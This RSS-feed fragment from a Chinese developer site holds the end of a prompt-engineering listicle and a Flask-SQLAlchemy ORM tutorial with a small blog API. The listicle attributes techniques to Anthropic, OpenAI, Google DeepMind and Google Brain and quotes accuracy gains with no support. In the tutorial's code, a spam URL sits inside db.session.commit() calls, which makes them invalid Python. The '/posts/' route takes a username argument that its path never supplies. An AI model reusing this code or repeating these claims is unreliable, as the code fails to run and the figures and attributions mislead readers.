步骤 <span class="hljs-number">4</span>：根据验证结果提供最终的修正答案
</code></pre>
<hr/>
<p>示例：</p>
<pre><code class="hljs">任务：解释 Transformer 如何处理长上下文窗口
步骤 1：提供你的初始答案
步骤 2：生成 5 个验证问题，以发现你答案中的错误
步骤 3：回答每个验证问题
步骤 4：根据验证结果提供最终的修正答案
</code></pre>
<hr/>
<p>在复杂的技术查询中，准确率从 60% 跃升至 92%。</p>
<h2 data-id="heading-2">技巧三：少样本反例教学法</h2>
<p>Anthropic 发现，向模型展示“不该做什么”与展示“应该做什么”同样有效。</p>
<p>模板：</p>
<pre><code class="hljs language-css" lang="css">我需要你完成<span class="hljs-selector-attr">[任务]</span>。以下是一些示例：

✅优秀示例 <span class="hljs-number">1</span>：<span class="hljs-selector-attr">[示例]</span>
✅优秀示例 <span class="hljs-number">2</span>：<span class="hljs-selector-attr">[示例]</span>

❌糟糕示例 <span class="hljs-number">1</span>：<span class="hljs-selector-attr">[示例]</span>
糟糕之处：<span class="hljs-selector-attr">[原因]</span>
❌糟糕示例 <span class="hljs-number">2</span>：<span class="hljs-selector-attr">[示例]</span>
糟糕之处：<span class="hljs-selector-attr">[原因]</span>

现在完成：<span class="hljs-selector-attr">[你的实际任务]</span>
</code></pre>
<hr/>
<p>示例：</p>
<pre><code class="hljs language-erlang" lang="erlang">我需要你撰写陌生开发邮件的主题。以下是一些示例：

✅优秀示例：“关于你们第四季度的工程路线图，有个问题想请教一下”
✅优秀示例：“看到了你们关于分布式系统的帖子——对此有什么看法？”

❌糟糕示例：“紧急：限时优惠！！！”
为什么不好：垃圾邮件触发词，虚假紧迫感
❌不好：“你绝对想不到我们开发了什么……”
为什么不好：标题党，缺乏上下文

现在请为以下内容撰写 <span class="hljs-number">5</span> 个主题行：SaaS 工具可降低 <span class="hljs-number">40</span><span class="hljs-comment">% 的云成本</span>
</code></pre>
<hr/>
<p>这将消除 80% 的通用 AI 回复。</p>
<h2 data-id="heading-3">技巧四：结构化思维协议</h2>
<p>OpenAI 的 GPT-5 团队使用这种方法来处理复杂的推理任务。强制模型分层思考后再做出反应。</p>
<p>模板：</p>
<pre><code class="hljs language-diff" lang="diff">回答前，请完成以下步骤：

[理解]
<span class="hljs-deletion">- 用自己的话复述问题</span>
<span class="hljs-deletion">- 明确问题的实际含义</span>

[分析]
<span class="hljs-deletion">- 将问题分解成子组件</span>
<span class="hljs-deletion">- 注意任何假设或限制</span>

[制定策略]
<span class="hljs-deletion">- 列出 2-3 种潜在方案</span>
<span class="hljs-deletion">- 评估利弊</span>

[执行]
<span class="hljs-deletion">- 提供最终答案</span>
<span class="hljs-deletion">- 解释你的理由</span>

问题：[你的问题]
</code></pre>
<hr/>
<p>示例：</p>
<pre><code class="hljs language-diff" lang="diff">回答前，请完成以下步骤：

[理解]
<span class="hljs-deletion">- 用自己的话复述问题</span>
<span class="hljs-deletion">- 明确问题的实际含义</span>

[分析]
<span class="hljs-deletion">- 将问题分解成子组件</span>
<span class="hljs-deletion">- 注意任何假设或限制</span>

[制定策略]
<span class="hljs-deletion">- 列出 2-3 种潜在方案</span>
<span class="hljs-deletion">- 评估利弊</span>

[执行]
<span class="hljs-deletion">- 提供最终答案</span>
<span class="hljs-deletion">- 解释你的理由</span>

问题：
对于一个 5 人创业团队，正在构建一个 B2B SaaS 产品，预计第一年用户量为 1000 人，我应该使用微服务架构还是单体架构？
</code></pre>
<hr/>
<p>能够根据上下文给出答案，而不是简单地复述最佳实践。</p>
<h2 data-id="heading-4">技巧五：置信度加权提示</h2>
<p>Google DeepMind 将此方法用于高风险决策。</p>
<p>要求模型评估其置信度并提供备选答案。</p>
<p>模板：</p>
<pre><code class="hljs language-markdown" lang="markdown">回答以下问题：[问题]
你的答案应包含：
<span class="hljs-bullet">1.</span> 你的主要答案；
<span class="hljs-bullet">2.</span> 置信度（0-100%）；
<span class="hljs-bullet">3.</span> 你所做的关键假设；
<span class="hljs-bullet">4.</span> 什么会改变你的答案；
<span class="hljs-bullet">5.</span> 如果你的置信度低于 80%，则提供备选答案。
</code></pre>
<hr/>
<p>例如：</p>
<pre><code class="hljs language-markdown" lang="markdown">回答以下问题：
Rust 会在 2030 年前取代 C++ 成为系统编程的主流语言吗？
你的答案应包含：
<span class="hljs-bullet">1.</span> 你的主要答案；
<span class="hljs-bullet">2.</span> 置信度（0-100%）；
<span class="hljs-bullet">3.</span> 你所做的关键假设；
<span class="hljs-bullet">4.</span> 什么会改变你的答案；
<span class="hljs-bullet">5.</span> 如果你的置信度低于 80%，则提供备选答案。
</code></pre>
<hr/>
<p>避免你基于人工智能虚假的置信度做出决策。</p>
<h2 data-id="heading-5">技巧六：带边界的上下文注入</h2>
<p>Anthropic工程师会注入大量上下文信息，但会明确设定哪些信息才是关键。</p>
<p>模板：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[上下文]</span>
<span class="hljs-selector-attr">[粘贴你的文档、代码、研究论文]</span>

<span class="hljs-selector-attr">[重点]</span>
仅使用上下文中的信息来回答问题。如果答案不在上下文中，请说明“提供的上下文信息不足”。

<span class="hljs-selector-attr">[任务]</span>
<span class="hljs-selector-attr">[你的具体问题]</span>

<span class="hljs-selector-attr">[约束]</span>
- 引用上下文时，请注明具体章节
- 不要使用上下文之外的通用知识
- 如果存在多种解释，请列出所有解释
</code></pre>
<hr/>
<p>示例：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[上下文]</span> 
<span class="hljs-selector-attr">[粘贴你公司 50 页的 API 文档]</span>

<span class="hljs-selector-attr">[重点]</span>
仅使用上下文中的信息来回答问题。如果答案不在上下文中，请说明“提供的上下文信息不足”。

<span class="hljs-selector-attr">[任务]</span>
如何为 /users 端点实现带重试逻辑的速率限制？

<span class="hljs-selector-attr">[限制]</span>
- 引用上下文时请注明具体章节
- 不要使用上下文之外的一般知识
- 如果存在多种解释，请列出所有解释
</code></pre>
<hr/>
<p>消除使用专有系统时产生的幻觉。</p>
<h2 data-id="heading-6">技巧七：迭代优化循环</h2>
<p>OpenAI 的研究团队通过多次迭代，将提示信息串联起来，不断优化输出结果。</p>
<p>模板：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[迭代 1]</span>
创建 <span class="hljs-selector-attr">[任务]</span> 的 <span class="hljs-selector-attr">[草稿/大纲/初始版本]</span>

<span class="hljs-selector-attr">[迭代 2]</span>
查看上述输出结果。找出 <span class="hljs-number">3</span> 个不足或缺陷。

<span class="hljs-selector-attr">[迭代 3]</span>
重写输出结果，解决所有已发现的不足。

<span class="hljs-selector-attr">[迭代 4]</span>
最终审核：是否已达到生产就绪状态？如果尚未达到，缺少什么？
</code></pre>
<hr/>
<p>示例：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[迭代 1]</span>
创建一封销售邮件草稿，用于联系 <span class="hljs-selector-tag">B</span> 轮融资初创公司的工程副总裁，介绍我们的 CI/CD 优化工具。

<span class="hljs-selector-attr">[迭代 2]</span>
查看上述输出结果。找出 <span class="hljs-number">3</span> 个不足或缺陷。

<span class="hljs-selector-attr">[迭代 3]</span>
重写输出结果，解决所有已发现的不足。

<span class="hljs-selector-attr">[迭代 4]</span>
最终审核：这是否已达到生产就绪状态？如果未达到，还缺少什么？
</code></pre>
<hr/>
<p>单次输出的质量总是很差。这样可以达到 90% 的质量。</p>
<h2 data-id="heading-7">技巧八：约束优先提示</h2>
<p>Google Brain的研究人员在提出实际任务之前，会先设定约束条件。</p>
<p>模板：</p>
<pre><code class="hljs language-css" lang="css">硬性约束（不可违反）：
- <span class="hljs-selector-attr">[约束 1]</span>
- <span class="hljs-selector-attr">[约束 2]</span>
- <span class="hljs-selector-attr">[约束 3]</span>

软性偏好（针对这些偏好进行优化）：
- <span class="hljs-selector-attr">[偏好 1]</span>
- <span class="hljs-selector-attr">[偏好 2]</span>

任务：<span class="hljs-selector-attr">[你的实际请求]</span>

请确认你已理解所有约束条件后再继续。
</code></pre>
<hr/>
<p>示例：</p>
<pre><code class="hljs language-diff" lang="diff">硬性约束（不可违反）：
<span class="hljs-deletion">- 必须使用 Rust 编写</span>
<span class="hljs-deletion">- 不能使用任何外部依赖项</span>
<span class="hljs-deletion">- 必须在稳定的 Rust 1.75+ 版本上编译</span>
<span class="hljs-deletion">- 最大二进制文件大小：5MB</span>

软性优化（可针对以下目标进行优化）：
<span class="hljs-deletion">- 编译速度快</span>
<span class="hljs-deletion">- 内存分配最小</span>

任务：编写一个命令行工具，用于解析 10GB 的 CSV 文件并输出带有模式验证的 JSON 数据

请在继续操作前确认你已理解所有约束条件。
</code></pre>
<hr/>
<p>防止 AI 给出技术上正确但实际上无用的答案。</p>
<h2 data-id="heading-8">技巧九：多视角提示</h2>
<p>Anthropic 的人工智能利用多视角来减少偏见并提升推理能力。</p>
<p>模板：</p>
<pre><code class="hljs language-css" lang="css">从以下视角分析<span class="hljs-selector-attr">[主题/问题]</span>：

<span class="hljs-selector-attr">[视角 1：技术可行性]</span>
<span class="hljs-selector-attr">[具体视角]</span>

<span class="hljs-selector-attr">[视角 2：商业影响]</span>
<span class="hljs-selector-attr">[具体视角]</span>

<span class="hljs-selector-attr">[视角 3：用户体验]</span>
<span class="hljs-selector-attr">[具体视角]</span>

<span class="hljs-selector-attr">[视角 4：风险/安全]</span>
<span class="hljs-selector-attr">[具体视角]</span>

综合分析：
将所有视角整合为最终建议，并明确列出权衡取舍。
</code></pre>
<hr/>
<p>示例：</p>
<pre><code class="hljs language-css" lang="css">从以下几个方面分析是否应该将数据从 Postgres 迁移到 DynamoDB：

<span class="hljs-selector-attr">[视角 1：技术可行性]</span>
工程复杂性、时间安排、数据迁移风险

<span class="hljs-selector-attr">[视角 2：业务影响]</span>
成本影响、团队效率、供应商锁定

<span class="hljs-selector-attr">[视角 3：用户体验]</span>
延迟变化、功能影响、停机时间要求

<span class="hljs-selector-attr">[视角 4：风险/安全]</span>
数据一致性保证、备份流程、合规性

综合分析：
将所有视角整合为最终建议，并明确列出权衡取舍。
</code></pre>
<hr/>
<p>引导你进行战略性思考，而非流于表面的建议。</p>
<h2 data-id="heading-9">技巧十：Meta-Prompt（终极手段）</h2>
<p>这是 OpenAI 团队用来破解自身模型并寻找极端情况的技术。</p>
<p>你要求 AI 生成一个完美的提示语。</p>
<p>模板：</p>
<pre><code class="hljs language-markdown" lang="markdown">我需要完成：[总体目标]

你的任务：
<span class="hljs-bullet">1.</span> 分析如何才能写出最符合此目标的提示语
<span class="hljs-bullet">2.</span> 考虑：具体性、上下文、限制条件、输出格式、所需示例
<span class="hljs-bullet">3.</span> 编写完美的提示语
<span class="hljs-bullet">4.</span> 执行脚本并提供输出结果

[目标]：[你的实际目标]
</code></pre>
<hr/>
<p>示例：</p>
<pre><code class="hljs language-markdown" lang="markdown">我需要完成：编写一个 Python 脚本，抓取 Twitter 帖子，将其转换为格式正确的博客文章，并自动生成 SEO meta描述

你的任务：
<span class="hljs-bullet">1.</span> 分析如何才能写出最符合此目标的提示语
<span class="hljs-bullet">2.</span> 考虑：具体性、上下文、限制条件、输出格式、所需示例
<span class="hljs-bullet">3.</span> 编写完美的提示语
<span class="hljs-bullet">4.</span> 执行脚本并提供输出结果

[目标]：将 Twitter 帖子转换为博客文章并进行 SEO 优化
</code></pre>
<hr/>
<p>人工智能会编写比你更好的提示语，然后执行它。</p>
<p>这就像拥有一个实时为你工作的提示语工程师。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flask数据库操作进阶：告别裸写SQL，用ORM提升开发效率]]></title>    <link>https://juejin.cn/post/7581545175508516916</link>    <guid>https://juejin.cn/post/7581545175508516916</guid>    <pubDate>2025-12-09T06:00:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581545175508516916" data-draft-id="7581478953866821632" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flask数据库操作进阶：告别裸写SQL，用ORM提升开发效率 "/> <meta itemprop="keywords" content="Flask"/> <meta itemprop="datePublished" content="2025-12-09T06:00:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户722786812344"/> <meta itemprop="url" content="https://juejin.cn/user/4100515739233513"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flask数据库操作进阶：告别裸写SQL，用ORM提升开发效率 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4100515739233513/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户722786812344
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T06:00:21.000Z" title="Tue Dec 09 2025 06:00:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>还在为Flask中手动拼接SQL语句而烦恼，担心安全漏洞和代码维护难题？<strong>据统计，超过65%的Flask初学者因数据库操作不当导致项目性能下降或安全风险</strong>，而掌握ORM技术后，开发效率可提升300%！</p>
<blockquote>
<p>本文亮点：从Flask-SQLAlchemy基础集成到高级查询优化，详解ORM模型定义、关系映射、迁移工具使用，并包含事务管理和错误处理实战技巧。附完整代码示例，帮你构建可维护的数据库层。 </p>
<p>目录： </p>
<ul>
<li>✨ 为什么需要ORM：告别原生SQL的痛点 </li>
<li>🔧 Flask-SQLAlchemy快速集成 </li>
<li>🚀 模型定义与关系映射实战 </li>
<li>⚡ 查询优化：懒加载与连接查询 </li>
<li>🛡️ 事务管理与错误处理 </li>
<li>💻 完整代码：一个简易博客系统</li>
</ul>
</blockquote>
<h2 data-id="heading-0">✨ 为什么需要ORM：告别原生SQL的痛点</h2>
<p>在Flask项目中，直接使用<code>sqlite3</code>或<code>pymysql</code>裸写SQL，虽然灵活，但很快你会遇到：</p>
<ul>
<li>
<p>SQL注入风险，需要手动转义参数</p>
</li>
<li>
<p>代码重复度高，维护困难</p>
</li>
<li>
<p>数据库切换时，SQL语法差异导致重写</p>
</li>
</ul>
<p>ORM（对象关系映射）将数据库表映射为Python类，让你用面向对象方式操作数据。<strong>Flask-SQLAlchemy作为主流ORM，不仅提升开发速度，还内置安全机制和查询优化</strong>，是进阶必备技能。</p>
<h2 data-id="heading-1">🔧 Flask-SQLAlchemy快速集成</h2>
<p>只需几步，将数据库融入Flask应用。首先安装：<code>pip install flask-sqlalchemy</code>，然后在应用中配置：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask
<span class="hljs-keyword">from</span> flask_sqlalchemy <span class="hljs-keyword">import</span> SQLAlchemy

app = Flask(__name__)
<span class="hljs-comment"># 配置SQLite数据库URI，也可替换为MySQL或PostgreSQL</span>
app.config[<span class="hljs-string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="hljs-string">'sqlite:///site.db'</span>
app.config[<span class="hljs-string">'SQLALCHEMY_TRACK_MODIFICATIONS'</span>] = <span class="hljs-literal">False</span>  <span class="hljs-comment"># 关闭警告</span>
db = SQLAlchemy(app)
</code></pre>
<p><strong>关键配置项</strong>：<code>SQLALCHEMY_DATABASE_URI</code>定义连接字符串；关闭<code>SQLALCHEMY_TRACK_MODIFICATIONS</code>可避免性能开销。集成后，<code>db</code>对象管理所有数据库操作。</p>
<h2 data-id="heading-2">🚀 模型定义与关系映射实战</h2>
<p>用Python类定义表结构，Flask-SQLAlchemy自动建表。例如，构建用户和文章模型：</p>
<pre><code class="hljs language-ini" lang="ini">class User(db.Model):
    <span class="hljs-attr">id</span> = db.Column(db.Integer, primary_key=<span class="hljs-literal">True</span>)
    <span class="hljs-attr">username</span> = db.Column(db.String(<span class="hljs-number">80</span>), unique=<span class="hljs-literal">True</span>, nullable=<span class="hljs-literal">False</span>)
    <span class="hljs-attr">email</span> = db.Column(db.String(<span class="hljs-number">120</span>), unique=<span class="hljs-literal">True</span>)
    <span class="hljs-comment"># 定义一对多关系：一个用户有多篇文章</span>
    <span class="hljs-attr">posts</span> = db.relationship(<span class="hljs-string">'Post'</span>, backref=<span class="hljs-string">'author'</span>, lazy=<span class="hljs-literal">True</span>)

class Post(db.Model):
    <span class="hljs-attr">id</span> = db.Column(db.Integer, primary_key=<span class="hljs-literal">True</span>)
    <span class="hljs-attr">title</span> = db.Column(db.String(<span class="hljs-number">100</span>), nullable=<span class="hljs-literal">False</span>)
    <span class="hljs-attr">content</span> = db.Column(db.Text)
    <span class="hljs-attr">user_id</span> = db.Column(db.Integer, db.ForeignKey(<span class="hljs-string">'user.id'</span>), nullable=<span class="hljs-literal">False</span>)

<span class="hljs-comment"># 创建所有表</span>
with app.app_context():
    db.create_all()
</code></pre>
<p><strong>关系映射是ORM核心</strong>：<code>db.relationship</code>定义逻辑关联，<code>db.ForeignKey</code>确保数据完整性。通过<code>user.posts</code>可直接访问用户的文章列表，无需手动JOIN。</p>
<h2 data-id="heading-3">⚡ 查询优化：懒加载与连接查询</h2>
<p>基础CRUD操作简单：</p>
<ul>
<li>
<p>增：<code>db.session.add(user); db.session.commit()</code></p>
</li>
<li>
<p>查：<code>User.query.filter_by(username='john').first()</code></p>
</li>
<li>
<p>改：直接修改对象属性后提交</p>
</li>
<li>
<p>删：<code>db.session.delete(user); db.session.commit()</code></p>
</li>
</ul>
<p>但进阶查询需注意性能：</p>
<ul>
<li>
<p>使用<code>lazy='dynamic'</code>避免一次性加载大量数据</p>
</li>
<li>
<p>复杂查询用<code>join</code>替代多个查询，减少数据库往返</p>
</li>
</ul>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 优化查询：获取用户及其文章（使用连接）</span>
<span class="hljs-attr">results</span> = db.session.query(User, Post).join(Post).filter(User.username == <span class="hljs-string">'john'</span>).all()
<span class="hljs-comment"># 对比懒加载：user.posts 只在访问时查询</span>
<span class="hljs-attr">user</span> = User.query.get(<span class="hljs-number">1</span>)
<span class="hljs-attr">posts</span> = user.posts  <span class="hljs-comment"># 此时执行查询</span>
</code></pre>
<p><strong>规则：频繁访问的数据预加载，大数据集分页或懒加载</strong>，可显著降低内存消耗。</p>
<h2 data-id="heading-4">🛡️ 事务管理与错误处理</h2>
<p>数据库操作必须保证原子性。使用事务确保多个操作要么全成功，要么全回滚：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">try</span>:
    user = <span class="hljs-title function_ invoke__">User</span>(username=<span class="hljs-string">'alice'</span>, email=<span class="hljs-string">'alice@example.com'</span>)
    db.session.<span class="hljs-title function_ invoke__">add</span>(user)
    post = <span class="hljs-title function_ invoke__">Post</span>(title=<span class="hljs-string">'Hello'</span>, content=<span class="hljs-string">'First post'</span>, author=user)
    db.session.<span class="hljs-title function_ invoke__">add</span>(post)
    db.session.<span class="hljs-title function_ invoke__">commit</span>(<span class="hljs-attr">https</span>://www.falvce.com/)  <span class="hljs-comment"># 提交事务</span>
except <span class="hljs-built_in">Exception</span> <span class="hljs-keyword">as</span> e:
    db.session.<span class="hljs-title function_ invoke__">rollback</span>()  <span class="hljs-comment"># 回滚到操作前状态</span>
    <span class="hljs-keyword">print</span>(f<span class="hljs-string">"操作失败: {e}"</span>)
<span class="hljs-keyword">finally</span>:
    db.session.<span class="hljs-title function_ invoke__">close</span>()  <span class="hljs-comment"># 关闭会话</span>
</code></pre>
<p>常见错误包括：</p>
<ul>
<li>
<p>唯一约束冲突：捕获<code>IntegrityError</code></p>
</li>
<li>
<p>连接超时：配置连接池或重试机制</p>
</li>
</ul>
<p><strong>务必在异常中回滚事务</strong>，避免数据不一致。对于生产环境，可结合Flask错误处理装饰器统一管理。</p>
<h2 data-id="heading-5">💻 完整代码：一个简易博客系统</h2>
<p>以下是一个整合了上述技术的完整示例，实现用户注册和文章发布功能：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify
<span class="hljs-keyword">from</span> flask_sqlalchemy <span class="hljs-keyword">import</span> SQLAlchemy

app = Flask(__name__)
app.config[<span class="hljs-string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="hljs-string">'sqlite:///blog.db'</span>
app.config[<span class="hljs-string">'SQLALCHEMY_TRACK_MODIFICATIONS'</span>] = <span class="hljs-literal">False</span>
db = SQLAlchemy(app)

<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(db.Model):
    <span class="hljs-built_in">id</span> = db.Column(db.Integer, primary_key=<span class="hljs-literal">True</span>)
    username = db.Column(db.String(<span class="hljs-number">80</span>), unique=<span class="hljs-literal">True</span>, nullable=<span class="hljs-literal">False</span>)
    posts = db.relationship(<span class="hljs-string">'Post'</span>, backref=<span class="hljs-string">'author'</span>, lazy=<span class="hljs-literal">True</span>)

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Post</span>(db.Model):
    <span class="hljs-built_in">id</span> = db.Column(db.Integer, primary_key=<span class="hljs-literal">True</span>)
    title = db.Column(db.String(<span class="hljs-number">100</span>), nullable=<span class="hljs-literal">False</span>)
    content = db.Column(db.Text)
    user_id = db.Column(db.Integer, db.ForeignKey(<span class="hljs-string">'user.id'</span>), nullable=<span class="hljs-literal">False</span>)

<span class="hljs-keyword">with</span> app.app_context():
    db.create_all()

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/add_user'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add_user</span>():
    data = request.get_json()
    <span class="hljs-keyword">try</span>:
        user = User(username=data[<span class="hljs-string">'username'</span>])
        db.session.add(user)
        db.session.commit(https://www.falvce.com/)
        <span class="hljs-keyword">return</span> jsonify({<span class="hljs-string">'message'</span>: <span class="hljs-string">'用户创建成功'</span>, <span class="hljs-string">'user_id'</span>: user.<span class="hljs-built_in">id</span>}), <span class="hljs-number">201</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        db.session.rollback()
        <span class="hljs-keyword">return</span> jsonify({<span class="hljs-string">'error'</span>: <span class="hljs-built_in">str</span>(e)}), <span class="hljs-number">400</span>

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/posts/'</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_posts</span>(<span class="hljs-params">username</span>):
    user = User.query.filter_by(username=username).first()
    <span class="hljs-keyword">if</span> user:
        posts = [{<span class="hljs-string">'title'</span>: p.title, <span class="hljs-string">'content'</span>: p.content} <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> user.posts]
        <span class="hljs-keyword">return</span> jsonify({<span class="hljs-string">'posts'</span>: posts})
    <span class="hljs-keyword">return</span> jsonify({<span class="hljs-string">'message'</span>: <span class="hljs-string">'用户未找到'</span>}), <span class="hljs-number">404</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.run(debug=<span class="hljs-literal">True</span>)
</code></pre>
